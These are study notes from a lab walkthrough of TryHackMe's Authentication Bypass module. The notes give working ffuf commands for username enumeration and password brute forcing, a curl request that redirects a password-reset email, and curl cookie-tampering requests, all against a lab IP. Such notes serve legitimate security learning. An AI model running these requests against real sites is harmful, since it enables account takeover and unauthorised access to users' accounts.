---
{"dg-publish":true,"permalink":"/thm-notes/web-fundamentals-path/authentication-bypass/","title":"Authentication Bypass - THM Walkthrough","tags":["web"]}
---

<a href="https://blog.satvik.live/post/THM%2FWEB%2FAuthentication-Bypass-THM-Walkthrough" style="text-decoration:none;">
  <button style="
    background: linear-gradient(90deg, rgba(0,123,255,1) 0%, rgba(0,102,204,1) 100%);
    border: none; /* Remove borders */
    color: white; /* White text */
    padding: 10px 20px; /* Some padding */
    text-align: center; /* Centered text */
    text-decoration: none; /* Remove underline */
    display: flex; /* Use flexbox */
    align-items: center; /* Center items vertically */
    justify-content: center; /* Center items horizontally */
    font-size: 16px; /* Increase font size */
    margin: 4px 2px; /* Add some margin */
    cursor: pointer; /* Add a pointer on hover */
    border-radius: 12px; /* Rounded corners */
    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); /* Add shadow */
    transition: transform 0.2s; /* Animation for hover effect */
    height: 40px; /* Fixed height for better alignment */
  " onmouseover="this.style.transform='scale(1.05)';" onmouseout="this.style.transform='scale(1.0)';">
    Visit Walkthrough 👀
  </button>
</a>
# Notes: TryHackMe Authentication Bypass Module



## Overview
The TryHackMe Authentication Bypass module explores various methods to bypass website authentication mechanisms, which can lead to unauthorized access and potential data breaches. This module covers:
1. Username Enumeration
2. Brute Force Attacks
3. Logic Flaws in Authentication
4. Cookie Tampering

## Key Concepts and Tools

### Username Enumeration
- **Concept**: Identify valid usernames by analyzing error messages.
- **Tool**: `ffuf` (Fuzz Faster U Fool) - used to automate the process of finding valid usernames.
- **Command**:
  ```sh
  ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.252.140/customers/signup -mr "username already exists"
  ```
- **Insight**: The tool identifies usernames by looking for a specific error message indicating that the username already exists.

### Brute Force Attacks
- **Concept**: Attempt to guess passwords using a list of commonly used passwords.
- **Tool**: `ffuf` - used again for brute forcing credentials.
- **Command**:
  ```sh
  ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.252.140/customers/login -fc 200
  ```
- **Insight**: The tool tries different combinations of usernames and passwords to find valid credentials.

### Logic Flaws
- **Concept**: Exploit logical errors in the authentication process.
- **Example**: Manipulating the password reset process to redirect the reset email.
- **Tool**: `curl` - used to craft specific HTTP requests.
- **Command**:
  ```sh
  curl 'http://10.10.252.140/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email={your_email}@customer.acmeitsupport.thm'
  ```
- **Insight**: By changing the email address in the POST data, you can redirect the password reset email to an address you control.

### Cookie Tampering
- **Concept**: Modify cookies to gain unauthorized access or escalate privileges.
- **Example**: Changing plain text cookies to elevate privileges.
- **Tool**: `curl` - used to send HTTP requests with modified cookies.
- **Commands**:
  ```sh
  curl -H "Cookie: logged_in=true; admin=false" http://10.10.252.140/cookie-test
  curl -H "Cookie: logged_in=true; admin=true" http://10.10.252.140/cookie-test
  ```
- **Insight**: Understanding how cookies work and modifying them can allow unauthorized access to higher privilege areas of a website.

## Importance of Tools and Topics
- **`ffuf`**: Automates the process of finding valid usernames and passwords, saving time and increasing efficiency.
- **`curl`**: Allows crafting and sending specific HTTP requests, crucial for testing and exploiting web vulnerabilities.
- **Understanding Authentication Mechanisms**: Fundamental for identifying and exploiting weaknesses in web applications.
- **Learning from Logic Flaws**: Highlights the importance of thorough testing and code review to prevent security issues.

## How the Attacks Were Performed
1. **Username Enumeration**:
   - Used `ffuf` to automate sending signup requests with different usernames.
   - Looked for error messages indicating existing usernames.
2. **Brute Force Attacks**:
   - Used `ffuf` to try multiple password combinations for valid usernames.
   - Checked for successful login indicators (HTTP status codes).
3. **Logic Flaw Exploitation**:
   - Manually crafted `curl` requests to manipulate the password reset process.
   - Redirected password reset emails to an address under my control.
4. **Cookie Tampering**:
   - Examined and modified cookies to change session states.
   - Sent requests with modified cookies to gain higher privileges.

## Conclusion
The Authentication Bypass module on TryHackMe provides hands-on experience with identifying and exploiting common vulnerabilities in web authentication mechanisms. Mastery of these techniques is crucial for cybersecurity professionals, particularly those preparing for certifications like eJPT. Understanding the tools and methods discussed ensures a solid foundation in ethical hacking and web security.

-----

